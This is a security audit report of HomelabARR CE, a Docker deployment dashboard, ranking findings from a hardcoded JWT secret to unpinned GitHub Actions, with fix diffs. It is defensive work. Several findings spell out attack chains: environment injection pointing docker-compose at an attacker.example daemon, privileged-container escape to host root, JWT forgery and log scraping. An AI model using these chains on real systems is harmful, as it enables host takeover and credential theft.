# Round 1 — HomelabARR CE Security Audit (Baseline)

**Project:** HomelabARR CE (`smashingtags/homelabarr-ce`)
**Round:** 1 of N
**Type:** baseline security audit, no remediation
**Live target:** `https://ce-demo.homelabarr.com/` (Cloudflare-fronted)
**Repo state audited:** `main` @ `aa968c3` ("Merge dev: aggressive junk description filter", 22 min before audit)
**Stack confirmed:** Vite + React 18 SPA → nginx:1.27-alpine (frontend, 8080→8084) ↔ Node 24 + Express 4.18.3 + dockerode 4 + helmet 7 (backend, 8092) ↔ `/var/run/docker.sock` (RW)
**Status:** Findings ready for agent. No code changes made — diffs only.

---

## 0. Round 0 carryover

None. Baseline round.

---

## 1. Goal

Inventory every concrete security defect — code, config, defaults, docs — that a competent attacker could chain into root on the Docker host. Rank by exploitability and blast radius. Hand the agent a ranked backlog with WRONG/RIGHT diffs precise enough to implement without further questions.

Success = the agent finishes Round 2–N (one round per dimension below) and a fresh re-audit returns zero CRITICAL and zero HIGH.

---

## 2. Current state (verified live + source)

### 2.1 Blast radius context (don't lose sight of this)

The backend container has `/var/run/docker.sock` mounted **rw**, has `docker-cli` installed, and the backend user has **passwordless sudo** (`Dockerfile.backend` L36). Therefore: any unauthenticated code execution in the backend process, any auth bypass, or any privilege escalation inside the container is one `docker run -v /:/host --privileged` away from root on the host machine.

Every finding below should be read with that in mind. The authentication boundary is the only thing between an unauthenticated internet visitor and root on the host.

### 2.2 Live demo header posture (HTML shell vs API)

The SPA shell (`GET /`) is served by nginx and is missing every modern security header except cache-control:

```
HTTP/2 200
content-type: text/html
cache-control: no-cache, no-store, must-revalidate
server: cloudflare
(no CSP, no HSTS, no X-Frame-Options, no X-Content-Type-Options,
 no Referrer-Policy, no Permissions-Policy, no COOP/CORP/COEP)
```

The API responses (`GET /api/health`) DO have helmet defaults (Express applies them) but include **double-set headers** (`x-frame-options: SAMEORIGIN, SAMEORIGIN`) from helmet + nginx both setting them.

So: the document that actually executes JS in the user's browser has zero header protection; the JSON the JS fetches has good headers. That's exactly backwards from what you want.

### 2.3 Source posture (key files)

- `server/index.js` — 5,152 lines, ~52 routes, 12 `docker.sock` references, 6 `execSync` / 3 `spawn` uses, 1 `helmet()` call (no config), 1 `cors()` call, 1 global rate limiter
- `server/auth.js` — 479 lines, bcryptjs(12), JWT HS256, plaintext API-key storage, `Math.random()` for user IDs
- `server/environment-manager.js` — hardcoded JWT_SECRET fallback string, `AUTH_ENABLED` toggle
- `server/cli-bridge.js` — has `sanitizePathComponent` helper, but `executeDockerCompose` merges request-body envvars over `process.env`
- `Dockerfile.backend` — `USER homelabarr` ✓ but `homelabarr ALL=(ALL) NOPASSWD: ALL` in `/etc/sudoers`
- `homelabarr.yml` — `JWT_SECRET=...:-CHANGE-THIS-TO-A-SECURE-SECRET`, `DEFAULT_ADMIN_PASSWORD=...:-admin`, `/var/run/docker.sock:rw`, backend port bound to `0.0.0.0`
- `nginx.conf.template` — partial security headers, no CSP, `X-XSS-Protection: 1; mode=block` (deprecated/harmful)
- `.env.example` — comment claims `AUTH_ENABLED=true` *disables* authentication. **The comment is inverted.**
- `.github/workflows/*` — 31 third-party action references, **zero** pinned by SHA

---

## 3. Findings (ranked)

Conventions: **C** = critical, **H** = high, **M** = medium, **L** = low.


### C-1. Hardcoded JWT secret fallback in source

**Where:** `server/environment-manager.js` L101
**Current:**
```js
jwtSecret: process.env.JWT_SECRET || 'homelabarr-default-secret-change-in-production',
```

**Impact:** Anyone running the backend without setting `JWT_SECRET` is using this exact string. The string is in the public repo. Anyone on the internet can forge an admin JWT (`{id:"admin",username:"admin",role:"admin"}` signed HS256 with this secret) and hit `/api/deploy`. Production validation does check for this exact string and `process.exit(1)` — but **only when `environment === 'production'`**, which is driven by `NODE_ENV`. If `NODE_ENV` is unset, `isDevelopment` is true and validation is skipped (`server/index.js` L78). The compose file sets `NODE_ENV=production` so the prod path catches it — but anyone running outside that compose file (custom installs, dev-style installs, bare `node server/index.js`) is exposed.

**Fix (RIGHT):**
```js
// server/environment-manager.js — NO fallback, ever.
const jwtSecret = process.env.JWT_SECRET;
if (!jwtSecret || jwtSecret.length < 32) {
  console.error('FATAL: JWT_SECRET must be set to a value of at least 32 chars.');
  console.error('Generate one with: openssl rand -base64 32');
  process.exit(1);
}
// ...
jwtSecret,
```
Refuse to start without it, in all environments. Document the generator command in the same error message.

---

### C-2. Default admin password `admin` baked into compose

**Where:** `homelabarr.yml` L59, README install script, `auth.js` initialization
**Current:**
```yaml
- DEFAULT_ADMIN_PASSWORD=${DEFAULT_ADMIN_PASSWORD:-admin}
```
Plus README quick-install copies an unredacted `admin / admin` credential into prod by default.

**Impact:** Combined with C-1 and C-8 (no login throttling), an internet-exposed instance using stock `homelabarr.yml` falls to credential guessing in ~1 second. The README does say "Change the password right away" but the system **never forces** the change.

**Fix:**
1. Remove the `:-admin` default from `homelabarr.yml`. Make `DEFAULT_ADMIN_PASSWORD` required, fail-closed.
2. On first login with the default admin where `mustChangePassword: true` is set on the user record, return 403 with a `password_change_required` flag and a one-time change endpoint. Block all other endpoints until password is changed.
3. Better: don't ship a default admin at all. On first boot, generate a random 24-char password, print it to `docker logs` once, and require it to be used within 10 minutes or the user record self-deletes.

---

### C-3. Inverted documentation: `AUTH_ENABLED` comment claims wrong behavior

**Where:** `.env.example` L34
**Current:**
```
# Set to "true" to disable authentication entirely (local/trusted network only)
# AUTH_ENABLED=true
```

**Reality:** `AUTH_ENABLED=true` *enables* auth. `AUTH_ENABLED=false` *disables* it. The comment is the opposite of the code.

**Impact:** Users who copy this file and think "I want auth on" set it to `true` (correct outcome by luck). Users who think "this comment is wrong, let me actually disable for testing" set it to `false` and ship a production box with **all authentication off**, exposing every endpoint including `/api/deploy` to the internet. Either path is a footgun.

**Fix:**
```
# Authentication is ON by default. Set to "false" ONLY on local-only/trusted networks.
# Do not set AUTH_ENABLED=false on any host reachable from the internet — it disables
# all authentication and any visitor can deploy containers as root.
# AUTH_ENABLED=true
```

And in code (`environment-manager.js`): refuse to start if `AUTH_ENABLED=false` AND `BIND_ADDRESS != 127.0.0.1` AND `NODE_ENV=production`. Force-couple the auth-disable with loopback-only binding.

---

### C-4. Backend user has passwordless sudo

**Where:** `Dockerfile.backend` L36
**Current:**
```dockerfile
RUN addgroup -g 1001 homelabarr && \
    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr && \
    echo 'homelabarr ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
```

**Impact:** Defense-in-depth wholly broken. Any code injection that lands in the Node process can `sudo` to root inside the container. Once root in container with `/var/run/docker.sock` mounted → root on host.

**Fix:** Delete the sudoers line entirely. If specific commands need elevation (they shouldn't — Docker GID membership is what grants socket access), whitelist exact commands with NOPASSWD:
```dockerfile
RUN addgroup -g 1001 homelabarr && \
    adduser -u 1001 -G homelabarr -s /bin/bash -D homelabarr
# No sudoers entry. Docker socket access comes from group_add in compose.
```
README claim "Containers run as a non-root user" becomes accurate.

---

### C-5. `/deploy` gated by a single env flag that silently turns off auth

**Where:** `server/index.js` L3595
**Current:**
```js
app.post('/deploy', authEnabled ? requireAuth : optionalAuth, async (req, res) => { ... })
```
…where `authEnabled = process.env.AUTH_ENABLED !== 'false'`.

**Impact:** A single `AUTH_ENABLED=false` (which an admin might set "just for local dev") swaps the entire deployment surface from `requireAuth` to `optionalAuth`. No warning, no log, no halt-if-also-bound-to-0.0.0.0 check. The whole C-3 chain ends here.

**Fix:** Couple the toggle to a binding check (see C-3). And replace `authEnabled ? requireAuth : optionalAuth` with explicit middleware that fails closed:
```js
// auth.js
export function deployAuth() {
  if (!process.env.AUTH_ENABLED || process.env.AUTH_ENABLED === 'true') {
    return requireAuth();
  }
  // Auth disabled — only allow from loopback. Belt + suspenders.
  return (req, res, next) => {
    const ip = req.ip || req.connection?.remoteAddress;
    if (ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1') return next();
    return res.status(403).json({ error: 'Authentication disabled — endpoint restricted to loopback.' });
  };
}
```

---

### C-6. Request-body environment variables passed through to `docker-compose`

**Where:** `server/cli-bridge.js` L401–408 (`executeDockerCompose`)
**Current:**
```js
async executeDockerCompose(appPath, command, envVars = {}) {
  return new Promise((resolve, reject) => {
    const env = {
      ...process.env,
      ...envVars   // ← envVars originates from the HTTP request body (config).
    };
    const dockerCompose = spawn('docker-compose', ['-f', appPath, ...command.split(' ')], {
      env, cwd: path.dirname(appPath), stdio: ['pipe','pipe','pipe']
    });
```

**Impact:** Authenticated user controls `config` → controls `envVars` → controls docker-compose's entire process environment. Concrete attacks:
- `DOCKER_HOST=tcp://attacker.example:2375` — docker-compose connects to attacker's Docker daemon
- `PATH=/tmp/x:$PATH` plus a planted `/tmp/x/docker` → command hijack
- `DOCKER_CONFIG=/tmp/.docker` → attacker-controlled registry credentials
- `BUILDKIT_HOST=...`, `COMPOSE_FILE=/etc/passwd`, every other env var compose / docker / buildkit honors
- Subsequent containers launched by this compose inherit all of the above

Authenticated user → host root via docker socket. Auth gating helps; the surface is still too broad.

**Fix:** Allowlist exactly which env vars from `envVars` are permitted, and never merge the rest over `process.env`:
```js
const ALLOWED_TEMPLATE_VARS = new Set([
  'PUID','PGID','TZ','DOMAIN','APPDATA','CONFIG','DOCKERNETWORK',
  // ... explicit list from your template variable schema
]);

const filtered = Object.fromEntries(
  Object.entries(envVars).filter(([k]) => ALLOWED_TEMPLATE_VARS.has(k))
);

// Validate values: alphanumeric/dot/slash/colon only, length <= 256.
for (const [k, v] of Object.entries(filtered)) {
  if (typeof v !== 'string' || v.length > 256 || /[\r\n\0\`$]/.test(v)) {
    throw new Error(`Invalid template variable: ${k}`);
  }
}

const env = { ...process.env, ...filtered };
```

Also: `...command.split(' ')` — pin to a constant command for each entry point, never split. Right now only called with `'up -d'` but the signature invites future misuse.

---

### C-7. `/var/run/docker.sock` mounted `:rw` despite SECURITY.md saying `:ro` "where possible"

**Where:** `homelabarr.yml` L68
**Current:** `- /var/run/docker.sock:/var/run/docker.sock:rw`
**SECURITY.md L53:** "Mount the socket **read-only** where possible (`:ro`)"

**Impact:** RW socket = full Docker API = root on host. RO socket prevents writes but allows enumeration. HomelabARR fundamentally needs RW to deploy — but the policy and the default disagree.

**Fix:** Three options, pick one:
1. **Recommended:** Put a [docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy) sidecar in `homelabarr.yml` with a narrow allowlist (containers + images + networks + volumes write; everything else read/deny). Point the backend at the proxy. README already recommends this — make it the default.
2. Leave RW but add `cap_drop: [ALL]`, `cap_add: [SETUID, SETGID, DAC_OVERRIDE]` (whatever the backend actually needs), `security_opt: [no-new-privileges:true]`, `read_only: true` with explicit tmpfs/volume mounts.
3. Reconcile the SECURITY.md text with the actual default.

---

### C-8. No login throttling — verified live

**Where:** `server/index.js` L180 (`POST /auth/login` has no per-route limiter), only global 100 req/min/IP at L148
**Live test:**
```
6 wrong logins in <1s: ratelimit-remaining: 97,96,95,94,93,92 → all 401, no throttle
```

**Impact:** With C-2's default `admin/admin`, brute force succeeds in attempts 1-3. Distributed brute force across IPs is trivial.

**Fix:**
```js
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  skipSuccessfulRequests: true,
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts. Try again in 15 minutes.' },
  keyGenerator: (req) => `${req.ip}:${(req.body?.username || '').toLowerCase()}`,
});

app.post('/auth/login', loginLimiter, async (req, res) => { ... });
```

Plus account-level lockout in `auth.js`: after N failed attempts on a username (regardless of source IP), require manual unlock or TOTP/email reset. Track failed-attempt counter on the user record.

---

### C-9. Unauthenticated info disclosure: `/health`, `/containers/:id/logs`, `/containers/:id/stats`, `/ports/check`, `/ports/available`, `/stream/progress`

**Where:**
- `server/index.js` L459 `GET /health` — no auth
- L3304 `GET /containers/:id/stats` — no auth
- L3535 `GET /containers/:id/logs` — **no auth, returns container logs**
- L1355 `GET /ports/check` — no auth
- L1429 `GET /ports/available` — no auth
- L1245 `GET /stream/progress` — no auth (SSE)

**Live confirmation:**
- `GET /api/containers/x/logs` → 500 JSON with `/var/run/docker.sock` path + error stack
- `GET /api/ports/check` → 200 JSON listing in-use ports (`[30002, 8083]`)
- `GET /api/health` → 200 leaking Node v24.16.0, OS arch x64, total/free memory, container indicators, NODE_ENV

**Impact:**
- Container logs are the worst — apps frequently print secrets/tokens/DB strings to stdout. Scrape `/api/containers/*/logs` after enumerating IDs → free credential harvest.
- `/health` fingerprints Node + Alpine + arch — fuel for picking the right zero-day.
- Port enumeration on `/ports/check` reveals deployed services (and which CVEs to try).

**Fix:** Add `requireAuth()` to every endpoint above. For `/health`, return minimal `{status:"ok"}` to unauth callers, rich payload only when authenticated:
```js
app.get('/health', async (req, res) => {
  const authed = await tryAuth(req);
  if (!authed) return res.json({ status: 'ok' });
  return res.json(await buildHealthReport());
});
```

Error responses redacted in production — `server/index.js` L4701-4704 already does this conditionally — extend the pattern to docker-socket errors.

---

### C-10. API keys stored in plaintext with non-timing-safe compare

**Where:** `server/auth.js` L165 (saveApiKeys), L192–202 (validateApiKey)
**Current:**
```js
fs.writeFileSync(API_KEYS_FILE, JSON.stringify(keys, null, 2));
// ...
const entry = keys.find(k => k.key === key && !k.revoked);
```

**Impact:** Plaintext key storage = anyone with read access to the `homelabarr-config` volume gets every API key in cleartext, immediately usable. README boasts `crypto.randomBytes(32)` for generation — entropy doesn't matter when storage is verbatim. Also `===` is not timing-safe.

**Fix:**
```js
import crypto from 'crypto';
const HMAC_KEY = process.env.API_KEY_HMAC_KEY; // separate from JWT_SECRET, also required.

export function createApiKey(userId, label) {
  const key = 'hlr_' + crypto.randomBytes(32).toString('hex');
  const lookup = key.slice(0, 12);
  const hash = crypto.createHmac('sha256', HMAC_KEY).update(key).digest('hex');
  const entry = {
    id: 'key_' + crypto.randomBytes(8).toString('hex'),
    lookup, hash, userId, label: label || 'Mobile App',
    createdAt: new Date().toISOString(), lastUsed: null, revoked: false,
  };
  keys.push(entry); saveApiKeys(keys);
  return { ...entry, key };  // return cleartext key ONCE, never persist
}

export function validateApiKey(key) {
  if (!key || !key.startsWith('hlr_')) return null;
  const lookup = key.slice(0, 12);
  const hash = crypto.createHmac('sha256', HMAC_KEY).update(key).digest('hex');
  const keys = loadApiKeys();
  for (const c of keys.filter(k => k.lookup === lookup && !k.revoked)) {
    if (c.hash.length === hash.length &&
        crypto.timingSafeEqual(Buffer.from(c.hash, 'hex'), Buffer.from(hash, 'hex'))) {
      c.lastUsed = new Date().toISOString(); saveApiKeys(keys);
      return findUserById(c.userId);
    }
  }
  return null;
}
```

Add `POST /auth/api-keys/:id/rotate` for rotation without revoke+recreate.

---

### H-11. Missing security headers on the SPA shell (verified live)

**Where:** `nginx.conf.template` L15–18 (partial set), L57 (`location /` no add_header for CSP)
**Live response for `GET /` lacks:** `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, `Cross-Origin-Embedder-Policy`. Also present-but-wrong: `X-XSS-Protection: 1; mode=block` (deprecated, has historically introduced XSS in IE/Edge).

**Impact:** The SPA loads `analytics.mjashley.com/script.js` and React renders into a doc with no CSP. Any XSS sink (see H-13) gets free reign. No COOP/CORP/COEP — `window.opener` and cross-origin embedding unrestricted.

**Fix:** Replace the header block in `nginx.conf.template`:
```nginx
# Applied to ALL responses including 4xx/5xx via 'always'.
add_header Content-Security-Policy "default-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'; img-src 'self' data: https:; font-src 'self' data:; script-src 'self' https://analytics.mjashley.com; style-src 'self' 'unsafe-inline'; connect-src 'self' https://analytics.mjashley.com; object-src 'none'; upgrade-insecure-requests" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=(), usb=(), interest-cohort=()" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-site" always;
add_header X-XSS-Protection "0" always;
# server_tokens off; in http{} block to hide nginx version.
```

Move `X-Frame-Options` to `DENY` — no reason to allow same-origin framing of the dashboard.

Then **remove** duplicate header setting from helmet on Express, OR remove from nginx, so headers aren't double-set. Pick nginx as source of truth for the SPA shell, helmet for API JSON, never both.

---

### H-12. `sanitizePathComponent` is brittle (denylist regex)

**Where:** `server/cli-bridge.js` L11–13
**Current:**
```js
function sanitizePathComponent(input) {
  if (!input || typeof input !== 'string') return '';
  return input.replace(/[\/\\.]{2,}/g, '').replace(/[\/\\\0]/g, '').replace(/^\.+/, '');
}
```

**Impact:** Strips obvious traversal. Misses URL-encoded (`%2e%2e%2f`), Unicode lookalikes (U+2024 `․`), absolute paths. Any future code path that doesn't call this is exposed.

**Fix:** Allowlist + post-resolve verify:
```js
function safeJoin(base, ...parts) {
  for (const p of parts) {
    if (typeof p !== 'string' || !/^[a-z0-9][a-z0-9_-]{0,63}$/i.test(p)) {
      throw new Error(`Invalid path component: ${JSON.stringify(p)}`);
    }
  }
  const resolved = path.resolve(base, ...parts);
  const baseResolved = path.resolve(base) + path.sep;
  if (!resolved.startsWith(baseResolved) && resolved !== path.resolve(base)) {
    throw new Error('Path traversal detected');
  }
  return resolved;
}
```
Replace every `path.join(this.appsPath, sanitizePathComponent(x), ...)` with `safeJoin(this.appsPath, x, ...)`.

---

### H-13. JWT in `localStorage` + 3 `dangerouslySetInnerHTML` sinks in built bundle

**Where:** dist build of `src/` — bundle `index-CgBfXSrY.js` contains `dangerouslySetInnerHTML` ×3, `localStorage` ×13. Verify in source where each is used.

**Impact:** Token in localStorage is fully readable by any same-origin script. Combined with missing CSP on SPA shell (H-11), any one of three `dangerouslySetInnerHTML` sinks rendering user-controlled content = XSS = full token theft = remote deploy.

Likely culprits: markdown renderer (`react-markdown` in deps), error toasts with raw HTML, log viewers.

**Fix:**
1. Move auth token to `httpOnly; Secure; SameSite=Strict` cookie. Add CSRF token (double-submit cookie or per-session synchronizer pattern) for state-changing requests.
2. Audit each `dangerouslySetInnerHTML` callsite. If it renders user-controlled or template-derived content, route through DOMPurify with strict allowlist. Better: kill all three and use safe components.
3. Add a CSP `script-src` so even if XSS lands, the injected script can't `eval`/inline.

---

### H-14. Frontend Dockerfile missing `USER` directive

**Where:** `Dockerfile` (frontend) — creates `homelabarr:1001` user, chowns dirs, but final stage has no `USER homelabarr` directive before `ENTRYPOINT`.

**Impact:** nginx in the final image runs as root (the default `nginx:1.27-alpine` master process is root unless you switch). README claims "Containers run as a non-root user" — false for the frontend image.

**Fix:**
```dockerfile
# After all COPY/RUN steps, before ENTRYPOINT:
USER homelabarr
ENTRYPOINT ["/docker-entrypoint.sh"]
```
Note: nginx needs to listen on a port >= 1024 as non-root — your config listens on 8080, which is fine. PID file path may need adjusting to a user-writable location (you already chown `/var/run/nginx.pid` so that's set).

---

### H-15. Backend bound to `0.0.0.0` and host-exposed on 8092 by default

**Where:** `homelabarr.yml` L87
**Current:**
```yaml
ports:
  - "${BACKEND_PORT:-8092}:8092"
```

**Impact:** The container with docker-socket access is published directly on the host port. If the host firewall is misconfigured (or absent — single-machine homelab setups often run with no firewall), the deployment API is reachable from any LAN client at `http://host:8092`, bypassing the nginx proxy and any frontend-side controls. CORS won't save you — CORS is enforced by browsers, not by attacker-controlled clients.

**Fix:**
```yaml
ports:
  - "127.0.0.1:${BACKEND_PORT:-8092}:8092"  # loopback only
```
Or better: remove the `ports` block entirely and let the frontend container reach the backend over the internal `homelabarr` network only. `docker network` already isolates this.

---

### H-16. Dual-mode `requireAuth` middleware via `arguments.length`

**Where:** `server/auth.js` L357–442
**Current:**
```js
export function requireAuth(role) {
  if (arguments.length === 3 || (arguments.length === 1 && typeof role === 'object')) {
    const [req, res, next] = arguments.length === 3 ? arguments : [role, arguments[1], arguments[2]];
    // ... direct middleware path
  }
  // ... factory-returns-middleware path
}
```

**Impact:** Fragile dual-mode dispatch. If anyone writes `app.get('/foo', requireAuth('admin'))` (single string arg, not object), it falls through to the factory branch — fine. But `app.use(requireAuth)` (function reference) calls it with 3 args and works as middleware. `app.use(requireAuth())` calls factory. These three call patterns drift apart over time. Bigger risk: future devs misuse it (e.g. `requireAuth(someObject)` where someObject is the role definition object) and silently bypass the auth check.

**Fix:** Split into two clearly-named exports:
```js
// Direct middleware (no role check).
export function requireAuth(req, res, next) { ... }

// Factory returning role-checking middleware.
export function requireRole(role) { return (req, res, next) => { ... }; }
```
Then every callsite is explicit: `app.get('/x', requireAuth)` or `app.get('/x', requireAuth, requireRole('admin'))`. Remove magic-string `admin`-bypass — make it explicit with a role hierarchy table.

---

### H-17. Hardcoded magic-string `admin` role bypass

**Where:** `server/auth.js` L431, L452
**Current:**
```js
if (role && decoded.role !== role && decoded.role !== 'admin') { ... 403 }
if (req.user.role !== role && req.user.role !== 'admin') { ... 403 }
```

**Impact:** "admin" is a magic string that bypasses every `requireRole` check. Add a `moderator` or `superadmin` role later and you have to remember to update every callsite. Forget once → privilege escalation.

**Fix:** Centralize the hierarchy:
```js
const ROLE_HIERARCHY = { user: 1, operator: 2, admin: 3, superadmin: 4 };

export function hasRole(userRole, requiredRole) {
  return (ROLE_HIERARCHY[userRole] || 0) >= (ROLE_HIERARCHY[requiredRole] || 0);
}
```
Then every check is `if (!hasRole(req.user.role, role)) return res.status(403)...`.

---

### H-18. Duplicate route registrations: `/auth/login`, `/auth/me`, `/auth/change-password`, `/auth/users`

**Where:** `server/index.js`
- `POST /auth/login`: L180 AND L922
- `GET /auth/me`: L258 AND L994
- `POST /auth/change-password`: L275 AND L1019
- `GET /auth/users`: L369 AND L1009

**Impact:** Express uses the first-registered route. The second handler is dead code — but it's *security-sensitive* dead code that may have different validation rules. If you ever reorder middleware (`app.use`), the wrong handler can become active. Also indicates an incomplete refactor or a merge mistake.

**Fix:** Audit both copies. Pick the correct one. Delete the other. Add a test that grep-fails the build if duplicate route+method pairs exist:
```js
// tests/no-duplicate-routes.test.js
const routes = collectAllRoutes(app);  // walk app._router.stack
const seen = new Map();
for (const { method, path } of routes) {
  const key = `${method} ${path}`;
  if (seen.has(key)) throw new Error(`Duplicate route: ${key}`);
  seen.set(key, true);
}
```

---

### M-19. `generateUserId()` uses `Math.random()`

**Where:** `server/auth.js` L145–147
**Current:**
```js
export function generateUserId() {
  return 'user_' + Math.random().toString(36).substr(2, 9) + Date.now().toString(36);
}
```

**Impact:** Not auth-token-class, but the README explicitly says "Session tokens use crypto.randomBytes, not Math.random." That's accurate for sessions/API keys but **false for user IDs**. Any code that treats user IDs as guess-resistant (e.g. activity-log lookup, "share with user X" features) is wrong. `Math.random` is predictable enough for parallel-universe ID collisions and trivial enumeration.

**Fix:**
```js
import crypto from 'crypto';
export function generateUserId() {
  return 'user_' + crypto.randomBytes(12).toString('hex');
}
```

---

### M-20. `docker-entrypoint.sh` sed-injects `BACKEND_URL` into nginx config unvalidated

**Where:** `docker-entrypoint.sh` L4–6
**Current:**
```sh
BACKEND_URL=${BACKEND_URL:-http://backend:8092}
sed "s|BACKEND_URL_PLACEHOLDER|${BACKEND_URL}|g" \
    /etc/nginx/templates/nginx.conf.template > /etc/nginx/conf.d/default.conf
```

**Impact:** If `BACKEND_URL` is attacker-controlled (env injection vector, supply-chain compose tampering), any `|` in the value escapes the sed substitution into arbitrary nginx directives. Lower likelihood, but defense-in-depth fail.

**Fix:**
```sh
# Validate BACKEND_URL is a sane URL before substitution.
case "$BACKEND_URL" in
  http://*|https://*) ;;
  *) echo "FATAL: BACKEND_URL must start with http:// or https://"; exit 1 ;;
esac
if echo "$BACKEND_URL" | grep -qE '[|;<>` $()\\]'; then
  echo "FATAL: BACKEND_URL contains forbidden characters"; exit 1
fi
```

Or switch to `envsubst` (which expects `${VAR}` placeholders and is safer than sed) — though envsubst doesn't validate either, so the input check is still required.

---

### M-21. CORS `origin: '*'` in development mode + permissive preflight

**Where:** `server/environment-manager.js` L155–157, `server/index.js` L167–168
**Current:**
```js
// env-manager.js
if (environment === 'development') return '*';
// index.js dev preflight:
res.header('Access-Control-Allow-Origin', '*');
res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD');
```

**Impact:** If anyone ships with `NODE_ENV=development` to prod (it happens — see C-1 path), CORS is wide open and any third-party origin can read responses with credentials. Plus the dev preflight handler is overly permissive on headers.

**Fix:** In dev, default to `http://localhost:5173` and the local IP — not `*`. Or: refuse to start with `origin: '*'` if any external interface is bound:
```js
if (environment === 'development' && bindAddress !== '127.0.0.1' && bindAddress !== '::1') {
  console.warn('Wildcard CORS only safe on loopback. Refusing to use * with bind=' + bindAddress);
  return ['http://localhost:5173', 'http://127.0.0.1:5173'];
}
```

---

### M-22. JWT 24h expiry with no refresh / no server-side revocation list

**Where:** `server/environment-manager.js` L102, `server/auth.js` (generateToken, verifyToken)
**Current:** `JWT_EXPIRES_IN=24h`, no refresh flow, no revocation list. `verifyToken` just calls `jwt.verify`.

**Impact:** A stolen token (via H-13 XSS, or via logs, or via the OS clipboard, or via a compromised mobile app) is valid for 24h with **no way to revoke**. `/auth/logout` invalidates the *session* row server-side but `verifyToken` never checks against it — it just verifies the JWT signature, which still passes.

**Fix:** Short-lived access token + opaque refresh token + session-bound check:
1. Access JWT: 15 min expiry.
2. Refresh token: random 32-byte, stored in DB indexed by user ID, sent as httpOnly cookie. Used to mint new access tokens.
3. On every `verifyToken`, also confirm the JWT's `jti` claim is in the active-sessions list. Logout removes from list — token instantly dead.
4. Track concurrent sessions per user, allow per-session revoke from `/auth/sessions`.

---

### M-23. Express 4.18.3 — outdated, CVE-2024-29041 fixed in 4.19.2

**Where:** `package.json`
**Current:** `"express": "^4.18.3"`

**Impact:** CVE-2024-29041 (open redirect via `res.location` when input starts with `//`). Lower severity for HomelabARR specifically because you don't have user-controlled redirects today — but the caret pin means `npm ci` MAY resolve to 4.18.x without picking up 4.19.2's patch.

**Fix:** Bump to `"express": "^4.21.2"` (or current stable 5.x if you're up for the migration). Also add `npm audit` to CI as a blocking step, not just informational.

---

### M-24. All third-party GitHub Actions pinned by tag, not SHA (31 instances)

**Where:** `.github/workflows/*`
**Sample:**
- `actions/checkout@v6`
- `docker/build-push-action@v7`
- `peter-evans/create-pull-request@v7`
- `mikepenz/release-changelog-builder-action@v6`
- `dorny/paths-filter@v4`
- `actions/github-script@v8`
- … 25 more

**Impact:** If any action's tag is moved (compromise like the tj-actions/changed-files incident in March 2025), every workflow run pulls malicious code with access to `GITHUB_TOKEN`, secrets, and the runner. Pinning to a 40-char SHA + Dependabot/Renovate for periodic SHA bumps is the OpenSSF SLSA recommendation.

**Fix:** Pin every third-party action to commit SHA:
```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
```
Add `renovate.json` or Dependabot config to bump SHAs weekly with diffs visible in PR. Keep the human-readable version tag in the comment for sanity.

---

### M-25. Helmet called with default options (`app.use(helmet())`) — no explicit hardening

**Where:** `server/index.js` L145
**Current:** `app.use(helmet());`

**Impact:** Helmet defaults are decent but not project-tuned. CSP is permissive (`style-src 'self' 'unsafe-inline'` for example, which the live response confirms). HSTS default is 180 days (you want 2 years + preload). COEP not enabled by default (helmet 7).

**Fix:** Explicit configuration:
```js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],  // until you can nonce/hash
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  },
  strictTransportSecurity: { maxAge: 63072000, includeSubDomains: true, preload: true },
  crossOriginEmbedderPolicy: false,  // enable only after testing all images/iframes
  crossOriginOpenerPolicy: { policy: 'same-origin' },
  crossOriginResourcePolicy: { policy: 'same-site' },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

---

### M-26. Analytics script loaded without Subresource Integrity (SRI)

**Where:** `index.html` (Vite entry)
**Current:**
```html
<script defer src="https://analytics.mjashley.com/script.js" data-website-id="..."></script>
```

**Impact:** If `analytics.mjashley.com` is compromised or DNS-hijacked, the attacker controls a script with full DOM access on the dashboard. Pulls JWT from localStorage (H-13), intercepts API calls, redirects deploy actions.

**Fix:** Self-host Umami's `script.js` on the same origin (drop into `public/` as `analytics.js`, point Umami's `data-host-url` at `/api/analytics` reverse-proxied via nginx). Eliminates the external script dependency, simplifies CSP, removes the SRI requirement.

If you must keep it external:
```html
<script defer
        src="https://analytics.mjashley.com/script.js"
        integrity="sha384-<hash of pinned version>"
        crossorigin="anonymous"
        data-website-id="..."></script>
```

---

### M-27. Verbose 500 error JSON exposes file paths + operation context to unauthenticated callers

**Where:** confirmed live on `GET /api/containers/x/logs` — full error stack returned with HTTP 500
**Sample response:**
```json
{
  "success": false,
  "error": "connect ENOENT /var/run/docker.sock",
  "details": "connect ENOENT /var/run/docker.sock",
  "operation": "Get container logs",
  "timestamp": "...",
  "dockerStatus": "cli-mode"
}
```

**Impact:** Information disclosure (filesystem layout, Docker mode, internal operation names). Useful for attacker reconnaissance.

**Fix:** Strip operational detail from error responses in production:
```js
function sendError(req, res, status, message, internal) {
  // Always log full details server-side.
  logger.error('Request error', { url: req.url, internal });
  // To the wire: minimal payload.
  const body = { error: message };
  if (envConfig.environment !== 'production') body.details = internal;
  res.status(status).json(body);
}
```
